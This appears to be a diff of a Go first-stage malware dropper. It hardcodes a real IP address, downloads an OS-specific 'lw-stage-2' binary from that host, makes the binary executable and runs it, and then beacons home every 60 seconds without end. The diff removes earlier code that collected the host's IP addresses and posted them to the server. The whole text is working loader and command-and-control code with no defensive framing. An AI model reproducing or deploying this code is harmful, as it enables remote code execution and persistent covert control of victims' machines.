@@ -9,7 +9,7 @@ import (
 	"os"
 	"os/exec"
 	"time"
-	"encoding/json"
+	"runtime"
 )
 
 func http_post(url string, jsonStr []byte) error {
@@ -88,28 +88,21 @@ func get_ips() ([]string, error) {
 
 func main() {
 
-	// define constants
+	// get os type
+	os_type := runtime.GOOS
+
+	// define constants and variables
 	const ip = "54.184.116.123"
-	const filename = "lw-stage-2"	
+	var filename = "lw-stage-2-"+os_type
+	var post_url = "http://"+ip+"/lw-beacon"
+	var get_url = "http://"+ip+"/bin/"+filename
+	var body = []byte(`{"stage":"1"}`)
 
-        // get host IPs
-        ips, ip_err := get_ips()
-        if ip_err != nil {
-                panic(ip_err)
-        }
-
-	// convert ip list slice to json
-	body, err := json.Marshal(ips)
-	if err != nil {
-		fmt.Printf("Error: %s", err.Error())
-	}
-
-	//wait a few seconds
-	time.Sleep(3 * time.Second)
+	// wait a few seconds
+        time.Sleep(3 * time.Second)
 
 	// download second stage file
-	get_url := fmt.Sprintf("http://%s/bin/%s", ip, filename)
-
+	fmt.Println("Downloading stage 2...")
 	get_err := http_get(get_url, filename)
 	if get_err != nil {
 		panic(get_err)
@@ -117,7 +110,7 @@ func main() {
 
 	// make file executable
 	chmod_err := os.Chmod(filename, 0777)
-	if err != nil {
+	if chmod_err != nil {
 		panic(chmod_err)
 	}
 
@@ -131,6 +124,7 @@ func main() {
 	}
 
 	// execute second stage binary
+	fmt.Println("Executing stage 2...")
 	command := exec.Command(path+"/"+filename)
 	exec_err := command.Run()
 	if exec_err != nil {
@@ -141,7 +135,6 @@ func main() {
         time.Sleep(3 * time.Second)
 
         // beacon home every 60 seconds forever
-	post_url := fmt.Sprintf("http://%s/lw-beacon", ip)
 	for {
 	        post_err := http_post(post_url, body)
 	        if post_err != nil {
